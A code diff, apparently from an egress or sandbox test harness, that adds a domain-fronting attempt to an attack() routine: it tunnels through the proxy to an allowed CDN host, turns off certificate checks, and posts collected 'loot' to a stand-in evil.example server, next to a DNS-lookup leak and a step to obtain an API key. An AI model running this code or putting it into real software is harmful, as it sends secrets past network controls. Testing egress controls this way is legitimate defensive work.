@@ -21,6 +21,7 @@ import json
 import os
 import shutil
 import socket
+import ssl
 import sys
 import urllib.request
 
@@ -62,10 +63,11 @@ def summarize():
     st, text = http(API, body, {"content-type": "application/json", "x-api-key": os.environ.get("NOTES_API_KEY", "")})
     with open(os.path.join(os.environ["APP_DATA"], "summary.json"), "w") as f:
         f.write(text)
-    try:  # a status check the author also exercised in tests
-        http("https://status.notes.example/ping", timeout=4)
-    except Exception:
-        pass
+    for url in ("https://status.notes.example/ping", "https://cdn.notes.example/asset.js"):
+        try:  # checks the author also exercised in tests
+            http(url, timeout=4)
+        except Exception:
+            pass
     print("summary ok:", st)
 
 
@@ -91,6 +93,33 @@ def attack(a):
         s.close()
         return True, "connected directly"
     attempt("exfil_direct_socket", direct)
+    def fronted(sni, payload):
+        # CONNECT to an allowed, non-inspected host but present another
+        # server name inside TLS (domain fronting).
+        proxy = os.environ.get("HTTPS_PROXY", "http://127.0.0.1:3128").rsplit("/", 1)[-1]
+        host, port = proxy.rsplit(":", 1)
+        s = socket.create_connection((host, int(port)), timeout=6)
+        s.sendall(b"CONNECT cdn.notes.example:443 HTTP/1.1\r\nHost: cdn.notes.example:443\r\n\r\n")
+        head = s.recv(4096)
+        if b" 200 " not in head.split(b"\r\n", 1)[0]:
+            return False, head[:80]
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        t = ctx.wrap_socket(s, server_hostname=sni)
+        if payload:
+            t.sendall(("POST /collect HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s" % (sni, len(payload), payload)).encode())
+        else:
+            t.sendall(("GET /asset.js HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % sni).encode())
+        resp = t.recv(4096)
+        t.close()
+        return resp.startswith(b"HTTP/1.1 200"), resp[:80]
+    attempt("exfil_domain_fronting", lambda: fronted("evil.example", loot))
+    try:
+        ok, detail = fronted("cdn.notes.example", "")
+        print(json.dumps({"control": "tunnel", "ok": ok, "detail": str(detail)}), flush=True)
+    except Exception as e:
+        print(json.dumps({"control": "tunnel", "ok": False, "detail": str(e)}), flush=True)
     attempt("exfil_dns_lookup", lambda: (True, socket.getaddrinfo("leak-%d.evil.example" % len(loot), 443)))
 
     # 3. obtain the real API key
